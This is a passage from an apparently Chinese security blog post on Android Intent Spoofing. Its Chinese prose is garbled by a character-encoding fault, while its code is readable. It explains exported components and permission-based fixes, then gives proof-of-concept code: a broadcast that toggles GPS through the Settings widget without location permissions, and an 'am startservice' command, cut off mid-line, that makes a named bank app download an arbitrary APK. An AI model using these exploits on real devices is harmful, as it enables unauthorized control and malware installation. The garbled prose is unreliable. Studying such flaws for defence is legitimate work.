å†æˆ–è€…ç”±<br>startService()&#x2F;bindservice()æ¥å¯åŠ¨ä¸€ä¸ªåå°çš„service.æ‰€ä»¥å¯ä»¥çœ‹å‡ºæ¥ï¼Œintentä¸»è¦<br>æ˜¯ç”¨æ¥å¯åŠ¨å…¶ä»–çš„activity æˆ–è€…serviceï¼Œæ‰€ä»¥å¯ä»¥å°†intentç†è§£æˆactivityä¹‹é—´çš„ç²˜åˆå‰‚ã€‚</p><h2 id="1-Intent"><a href="#1-Intent" class="headerlink" title="1. Intent"></a>1. Intent</h2><p>Intentæœ‰ä¸¤ç§ç±»å‹ï¼ŒExplicit Intent å’Œ Implicit Intentã€‚</p><ul><li>Explicit Intent</li></ul><p>æ˜ç¡®æŒ‡å®šIntentçš„åå­—(å…¨ç±»å)ï¼Œå½“ä½ ä½¿ç”¨Explicit Intent å¯åŠ¨Activityæˆ–è€…å¯åŠ¨ Serviceï¼Œ<br>Androidç³»ç»Ÿä¼šç«‹å³å¯åŠ¨Intentå¯¹è±¡æ‰€æŒ‡å®šçš„Componentã€‚</p><ul><li>Implicit Intent</li></ul><p>æŒ‡å®šIntentçš„ACTIONï¼Œå½“ä½ ä½¿ç”¨Implicit Intentï¼ŒAndroidç³»ç»Ÿå°†é€šè¿‡æ¯”è¾ƒ App Manifest<br>æ–‡ä»¶ä¸­æ‰€å®šä¹‰çš„Intent filteræ¥å¯åŠ¨ç¬¦åˆè¦æ±‚çš„Componentã€‚å¦‚æœåªæœ‰ä¸€ä¸ªIntentfilter<br>è¢«åŒ¹é…æˆåŠŸï¼Œç³»ç»Ÿå°†å¯åŠ¨å¯¹åº”çš„Componentï¼Œå¹¶é€’é€Intent Objectã€‚å¦‚æœæœ‰å¤šä¸ªintent<br>filteræ˜¯å…¼å®¹çš„ï¼Œç³»ç»Ÿå°†æ˜¾ç¤ºä¸€ä¸ªdialogï¼Œç”¨æˆ·å¯ä»¥é€‰æ‹©éœ€è¦ä½¿ç”¨çš„component</p><p>ä¸‹é¢ç”¨ä»£ç è¯´æ˜è¿™ä¸¤ç§Intent</p><p>Explicit Intent</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Intent</span> <span class="hljs-variable">downloadIntent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(<span class="hljs-built_in">this</span>, DownloadService.class);<br>downloadIntent.setData(Uri.parse(fileUrl));<br>startService(downloadIntent);<br></code></pre></td></tr></table></figure><p>Implicit Intent</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Intent</span> <span class="hljs-variable">sendIntent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>();<br>sendIntent.setAction(Intent.ACTION_SEND);<br>sendIntent.putExtra(Intent.EXTRA_TEXT, textMessage);<br>sendIntent.setType(HTTP.PLAIN_TEXT_TYPE); <span class="hljs-comment">// &quot;text/plain&quot; MIME type</span><br><br><span class="hljs-comment">// Verify that the intent will resolve to an activity</span><br><span class="hljs-keyword">if</span> (sendIntent.resolveActivity(getPackageManager()) != <span class="hljs-literal">null</span>) &#123;<br>    startActivity(sendIntent);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-Intent-Spoofing"><a href="#2-Intent-Spoofing" class="headerlink" title="2. Intent Spoofing"></a>2. Intent Spoofing</h2><p>Android Intent Spoofingæ˜¯ä¸€ä¸ªæ¯”è¾ƒå¸¸è§çš„é—®é¢˜ã€‚å¦‚æœAndroidç»„ä»¶(component,service<br>receiver)æ˜¯å¯¼å‡ºçš„è¯(exported&#x3D;true)ï¼Œæ¶æ„ç¨‹åºå¯ä»¥ä½¿ç”¨ Explicit Intentå‘è¿™ä¸ªç»„ä»¶<br>å‘é€Intentï¼ŒAndroidæ— æ³•è¯†åˆ«è¿™ä¸ª Intentæ˜¯è°å‘é€çš„ï¼Œå°†ä¼šæ­£å¸¸çš„æ‰§è¡Œè¯·æ±‚çš„æ“ä½œã€‚</p><p>ä»ä¸Šé¢çš„æè¿°ä¸­å¯ä»¥å‘ç°ï¼Œå…³é”®æ˜¯ componentè¦æ˜¯å¯¼å‡ºçš„ï¼Œè€ŒAndroidçš„componentçš„å¯¼å‡ºçš„<br>é»˜è®¤å€¼å¹¶ä¸æ˜¯å›ºå®šçš„ï¼Œè¿™ç‚¹æˆ‘ä»¬ä»Googleæä¾›çš„æ–‡æ¡£å¯ä»¥è¯å®ã€‚</p><p><a href="http://developer.android.com/guide/topics/manifest/receiver-element.html">http://developer.android.com/guide/topics/manifest/receiver-element.html</a></p><p><strong>android:exported</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Whether <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> the broadcast receiver can receive messages <span class="hljs-keyword">from</span> sources outside<br>its application â€” &quot;true&quot; <span class="hljs-keyword">if</span> it can, <span class="hljs-keyword">and</span> &quot;false&quot; <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span>. <span class="hljs-keyword">If</span> &quot;false&quot;, the <span class="hljs-keyword">only</span> messages <br>the broadcast receiver can receive are those sent <span class="hljs-keyword">by</span> components <span class="hljs-keyword">of</span> the same <br>application <span class="hljs-keyword">or</span> applications <span class="hljs-keyword">with</span> the same <span class="hljs-keyword">user</span> ID.<br><br>The <span class="hljs-keyword">default</span> <span class="hljs-keyword">value</span> <span class="hljs-keyword">depends</span> <span class="hljs-keyword">on</span> whether the broadcast receiver contains intent filters.<br>The absence <span class="hljs-keyword">of</span> <span class="hljs-keyword">any</span> filters means that it can be invoked <span class="hljs-keyword">only</span> <span class="hljs-keyword">by</span> Intent objects <br>that specify its exact <span class="hljs-keyword">class</span> <span class="hljs-type">name</span>. This implies that the receiver <span class="hljs-keyword">is</span> intended <br><span class="hljs-keyword">only</span> <span class="hljs-keyword">for</span> application-<span class="hljs-type">internal</span> use (since others would <span class="hljs-keyword">not</span> normally know the <span class="hljs-keyword">class</span> <span class="hljs-type">name</span>). <br>So <span class="hljs-keyword">in</span> this <span class="hljs-keyword">case</span>, the <span class="hljs-keyword">default</span> <span class="hljs-keyword">value</span> <span class="hljs-keyword">is</span> &quot;false&quot;. <span class="hljs-keyword">On</span> the other hand, the presence <br><span class="hljs-keyword">of</span> at least one <span class="hljs-keyword">filter</span> implies that the broadcast receiver <span class="hljs-keyword">is</span> intended <span class="hljs-keyword">to</span> receive <br>intents broadcast <span class="hljs-keyword">by</span> the <span class="hljs-keyword">system</span> <span class="hljs-keyword">or</span> other applications, so the <span class="hljs-keyword">default</span> <span class="hljs-keyword">value</span> <span class="hljs-keyword">is</span> &quot;true&quot;.<br><br>This <span class="hljs-keyword">attribute</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> the <span class="hljs-keyword">only</span> way <span class="hljs-keyword">to</span> <span class="hljs-keyword">limit</span> a broadcast receiver<span class="hljs-string">&#x27;s external exposure.</span><br><span class="hljs-string">You can also use a permission to limit the external entities that can send it </span><br><span class="hljs-string">messages (see the permission attribute).</span><br></code></pre></td></tr></table></figure><p>æˆ‘å†™äº†ä¸€ä¸ªç¨‹åºæµ‹è¯•å…·ä½“çš„æƒ…å†µã€‚</p><p>AndroidManifest.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">uses-permission</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.permission.RECEIVE_SMS&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">receiver</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.PhoneReceiver&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:enabled</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.nsfocus.test&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">receiver</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æµ‹è¯•ç¨‹åºæ³¨å†Œäº†ä¸€ä¸ªReceiverï¼Œè¿™ä¸ªReceiverå¤„ç† com.nsfocus.test  <strong>Implicit Intent</strong><br>åŒ…å«äº†ä¸€ä¸ªIntent Filterï¼Œåœ¨AndroidManifest.xmlä¸­æ²¡æœ‰æ˜ç¡®å£°æ˜è¿™ä¸ªrecieveræ˜¯å¯¼å‡ºçš„<br>è¿˜æ˜¯æœªå¯¼å‡ºçš„ã€‚</p><p>receiver çš„ä»£ç ä¸º</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onReceive</span><span class="hljs-params">(Context context, Intent intent)</span> &#123;<br>        Toast.makeText(context, <span class="hljs-string">&quot;Get it&quot;</span>, Toast.LENGTH_LONG).show();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨adb shellä¸­å‘é€å¹¿æ’­</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">adb shell am broadcast -a com.nsfocus.test<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°Get it çš„æç¤ºä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯è¯´ component å¤„ç† Implicit Intent æ—¶é»˜è®¤æ˜¯<br><strong>exported&#x3D;true</strong> çš„ï¼Œè¿™å°±æ˜¯é—®é¢˜çš„å…³é”®ã€‚</p><p>ä¸‹é¢ä¿®æ”¹ä»£ç æ”¹æˆ <strong>exported&#x3D;false</strong>ï¼Œçœ‹çœ‹æ˜¯ä»€ä¹ˆæƒ…å†µã€‚</p><p>AndroidManifest.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">receiver</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.PhoneReceiver&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:enabled</span>=<span class="hljs-string">&quot;true&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;false&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.nsfocus.test&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">receiver</span>&gt;</span><br></code></pre></td></tr></table></figure><p>receiver ç…§æ ·å¯ä»¥æ”¶åˆ°ï¼Œæ˜¾ç¤ºâ€Get itâ€ï¼Œæ‰€ä»¥åœ¨receiveré‡Œåšæ ¡éªŒæ˜¯éå¸¸æœ‰å¿…è¦çš„ã€‚å› ä¸º<br>æ— è®ºexportedå¦‚ä½•è®¾ç½®ï¼Œåªè¦é‡Œé¢åŒ…å«äº†Intent Filter å°±å¯ä»¥æ¥å—åˆ°æ¶ˆæ¯ã€‚</p><h3 id="2-1-ä¸€èˆ¬è§£å†³æ–¹æ¡ˆ"><a href="#2-1-ä¸€èˆ¬è§£å†³æ–¹æ¡ˆ" class="headerlink" title="2.1 ä¸€èˆ¬è§£å†³æ–¹æ¡ˆ"></a>2.1 ä¸€èˆ¬è§£å†³æ–¹æ¡ˆ</h3><p>å¦‚æœè®¾ç½®äº† intent-filterï¼Œå¯ä»¥åˆ©ç”¨ android:permission å±æ€§æ¥è¦æ±‚å¹¿æ’­å‘é€è€…æ‰€<br>éœ€è¦å…·æœ‰çš„å¿…è¦æƒé™ï¼Œè¿™æ ·æ‰ä¸ä¼šäº§ç”Ÿæƒé™ç»•è¿‡é—®é¢˜ã€‚</p><p>æ¯”å¦‚æˆ‘åœ¨.PhoneReceiveré‡Œè¦å®ç°æ”¶çŸ­ä¿¡çš„åŠŸèƒ½ï¼Œå°±åº”è¯¥å†™æˆè¿™æ ·</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">receiver</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.PhoneReceiver&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:enabled</span>=<span class="hljs-string">&quot;true&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:permission</span>=<span class="hljs-string">&quot;android.permission.SMS_RECEIVED&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;false&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.PHONE_STATE&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">receiver</span>&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™æ ·å¹¿æ’­å‘é€è€…éœ€è¦å£°æ˜** android.permission.SMS_RECEIVED **æƒé™ï¼Œä¸ç„¶.PhoneReceiverå°±ä¸<br>å¤„ç†äº†ï¼Œä¿®æ”¹åæµ‹è¯•å‘ç°ç¡®å®æ”¶ä¸åˆ°äº†ã€‚</p><h3 id="2-2-æ¼æ´å®ä¾‹"><a href="#2-2-æ¼æ´å®ä¾‹" class="headerlink" title="2.2 æ¼æ´å®ä¾‹"></a>2.2 æ¼æ´å®ä¾‹</h3><h4 id="å¯ç”¨æ‰‹æœºGPS"><a href="#å¯ç”¨æ‰‹æœºGPS" class="headerlink" title="å¯ç”¨æ‰‹æœºGPS"></a>å¯ç”¨æ‰‹æœºGPS</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Intent</span> <span class="hljs-variable">intent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>();<br>intent.setClassName(<span class="hljs-string">&quot;com.android.settings&quot;</span>, <span class="hljs-string">&quot;com.android.settings.widget.SettingsAppWidgetProvider&quot;</span>);<br>intent.addCategory(<span class="hljs-string">&quot;android.intent.category.ALTERNATIVE&quot;</span>);<br>intent.setData(Uri.parse(<span class="hljs-string">&quot;custom:3&quot;</span>));<br>mContext.sendBroadcast(intent);<br></code></pre></td></tr></table></figure><p>ä¸Šé¢è¿™ä¸ªä¾‹å­æ˜¯é€šè¿‡å¹¿æ’­çš„æ–¹æ³•è¿›è¡Œæ”»å‡»çš„ï¼Œæ”»å‡»çš„ç›®æ ‡æ˜¯com.android.settings.widget<br>Androidå¹¶æœªæä¾›æ“ä½œGPSçš„APIï¼Œä½†æ˜¯é€šè¿‡ä¸Šé¢è¿™ä¸ªæ–¹æ³•å´å¯ä»¥æ§åˆ¶GPSçš„å¼€å…³ã€‚è€Œä¸”æ›´æœ‰è¶£<br>çš„æ˜¯æˆ‘ä»¬å¹¶æ²¡æœ‰å£°æ˜ä»»ä½•å’ŒLocationç›¸å…³çš„æƒé™ :)</p><p>widgetæ˜¯Androidæä¾›çš„æ¡Œé¢çš„å°æ’ä»¶ï¼Œå°±å’ŒKDEçš„ä¹‹ç±»çš„æ’ä»¶ç±»ä¼¼ï¼Œå¯ä»¥é€šè¿‡Googleæä¾›çš„<br>APIæ¥å¼€å‘ã€‚</p><p>custom:3 è¿™ä¸ªå­—ç¬¦ä¸²æ¯”è¾ƒè¯¡å¼‚ï¼Œå…¶å®å¯ä»¥åœ¨Android çš„ä»£ç ä¸­æ‰¾åˆ°</p><p>&#x2F;com&#x2F;android&#x2F;settings&#x2F;widget&#x2F;SettingsAppWidgetProvider.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">BUTTON_WIFI</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">BUTTON_BRIGHTNESS</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">BUTTON_SYNC</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">BUTTON_LOCATION</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">BUTTON_BLUETOOTH</span> <span class="hljs-operator">=</span> <span class="hljs-number">4</span>;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onReceive</span><span class="hljs-params">(Context context, Intent intent)</span> &#123;<br>    <span class="hljs-built_in">super</span>.onReceive(context, intent);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">action</span> <span class="hljs-operator">=</span> intent.getAction();<br>    <span class="hljs-keyword">if</span> (WifiManager.WIFI_STATE_CHANGED_ACTION.equals(action)) &#123;<br>        sWifiState.onActualStateChange(context, intent);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (BluetoothAdapter.ACTION_STATE_CHANGED.equals(action)) &#123;<br>        sBluetoothState.onActualStateChange(context, intent);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (LocationManager.MODE_CHANGED_ACTION.equals(action)) &#123;<br>        sLocationState.onActualStateChange(context, intent);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ContentResolver.ACTION_SYNC_CONN_STATUS_CHANGED.equals(action)) &#123;<br>        sSyncState.onActualStateChange(context, intent);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (intent.hasCategory(Intent.CATEGORY_ALTERNATIVE)) &#123;<br>        <span class="hljs-type">Uri</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> intent.getData();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">buttonId</span> <span class="hljs-operator">=</span> Integer.parseInt(data.getSchemeSpecificPart());<br>        <span class="hljs-keyword">if</span> (buttonId == BUTTON_WIFI) &#123;<br>            sWifiState.toggleState(context);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (buttonId == BUTTON_BRIGHTNESS) &#123;<br>            toggleBrightness(context);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (buttonId == BUTTON_SYNC) &#123;<br>            sSyncState.toggleState(context);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (buttonId == BUTTON_LOCATION) &#123;<br>            sLocationState.toggleState(context);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (buttonId == BUTTON_BLUETOOTH) &#123;<br>            sBluetoothState.toggleState(context);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Don&#x27;t fall-through to updating the widget.  The Intent</span><br>        <span class="hljs-comment">// was something unrelated or that our super class took</span><br>        <span class="hljs-comment">// care of.</span><br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// State changes fall through</span><br>    updateWidget(context);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°æ— æ³•å¯¹å¹¿æ’­çš„å‘é€è€…è¿›è¡Œæ ¡éªŒï¼Œæ”¶åˆ°å¹¿æ’­å°±æ‰§è¡Œç›¸å…³çš„åŠ¨ä½œã€‚</p><h4 id="æ±Ÿè‹é“¶è¡Œæ‰‹æœºé“¶è¡Œä¸‹è½½å®‰è£…ä»»æ„apkï¼ˆå¯æœ¨é©¬ï¼‰"><a href="#æ±Ÿè‹é“¶è¡Œæ‰‹æœºé“¶è¡Œä¸‹è½½å®‰è£…ä»»æ„apkï¼ˆå¯æœ¨é©¬ï¼‰" class="headerlink" title="æ±Ÿè‹é“¶è¡Œæ‰‹æœºé“¶è¡Œä¸‹è½½å®‰è£…ä»»æ„apkï¼ˆå¯æœ¨é©¬ï¼‰"></a>æ±Ÿè‹é“¶è¡Œæ‰‹æœºé“¶è¡Œä¸‹è½½å®‰è£…ä»»æ„apkï¼ˆå¯æœ¨é©¬ï¼‰</h4><p><a href="http://www.wooyun.org/bugs/wooyun-2010-0104992">http://www.wooyun.org/bugs/wooyun-2010-0104992</a></p><p>AndroidManifest.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">service</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.UpdateService&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;cn.jsb.china.UpdateService&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">service</span>&gt;</span><br></code></pre></td></tr></table></figure><p>UpdateService.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">onStartCommand</span><span class="hljs-params">(Intent arg6, <span class="hljs-type">int</span> arg7, <span class="hljs-type">int</span> arg8)</span> &#123;<br><br>    <span class="hljs-type">Bundle</span> <span class="hljs-variable">v0</span> <span class="hljs-operator">=</span> arg6.getExtras();<br><br>    <span class="hljs-keyword">if</span>(v0 != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-built_in">this</span>.a = v0.getBoolean(<span class="hljs-string">&quot;isupdate&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">this</span>.b = arg6.getStringExtra(<span class="hljs-string">&quot;url&quot;</span>);<br>    <span class="hljs-built_in">this</span>.c = <span class="hljs-built_in">this</span>.getSystemService(<span class="hljs-string">&quot;notification&quot;</span>);<br>    <span class="hljs-built_in">this</span>.d = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Notification</span>();<br>    <span class="hljs-built_in">this</span>.d.icon = <span class="hljs-number">17301633</span>;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.a) &#123;<br>        <span class="hljs-built_in">this</span>.i = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteViews</span>(<span class="hljs-built_in">this</span>.getPackageName(), <span class="hljs-number">2130903048</span>);<br>        <span class="hljs-built_in">this</span>.d.tickerText = <span class="hljs-string">&quot;æ­£åœ¨ä¸‹è½½æ±Ÿè‹é“¶è¡Œ&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">this</span>.i = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteViews</span>(<span class="hljs-built_in">this</span>.getPackageName(), <span class="hljs-number">2130903043</span>);<br>        <span class="hljs-built_in">this</span>.d.tickerText = <span class="hljs-string">&quot;æ­£åœ¨ä¸‹è½½æ‰‹æœºè¯åˆ¸&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-built_in">this</span>.d.when = System.currentTimeMillis();<br>    <span class="hljs-built_in">this</span>.d.flags |= <span class="hljs-number">2</span>;<br>    <span class="hljs-built_in">this</span>.d.flags |= <span class="hljs-number">32</span>;<br>    <span class="hljs-built_in">this</span>.d.defaults = <span class="hljs-number">4</span>;<br>    <span class="hljs-built_in">this</span>.d.contentView = <span class="hljs-built_in">this</span>.i;<br>    <span class="hljs-built_in">this</span>.d.setLatestEventInfo(((Context)<span class="hljs-built_in">this</span>), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, PendingIntent.getActivity(((Context)<span class="hljs-built_in">this</span>), <br>            <span class="hljs-number">0</span>, arg6, <span class="hljs-number">0</span>));<br><br>    <span class="hljs-built_in">this</span>.c.notify(<span class="hljs-built_in">this</span>.j, <span class="hljs-built_in">this</span>.d);<br>    <span class="hljs-built_in">this</span>.g = <span class="hljs-keyword">new</span> <span class="hljs-title class_">jn</span>(<span class="hljs-built_in">this</span>, Looper.myLooper(), ((Context)<span class="hljs-built_in">this</span>));<br>    <span class="hljs-built_in">this</span>.g.sendMessage(<span class="hljs-built_in">this</span>.g.obtainMessage(<span class="hljs-number">3</span>, Integer.valueOf(<span class="hljs-number">0</span>)));<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">jm</span>(<span class="hljs-built_in">this</span>, <span class="hljs-built_in">this</span>.b).start();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.onStartCommand(arg6, arg7, arg8);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨ä»£ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">am startservice -n cn.jsb.china/.UpdateService --ez isupdate <span class="hljs-literal">true</span> --es url 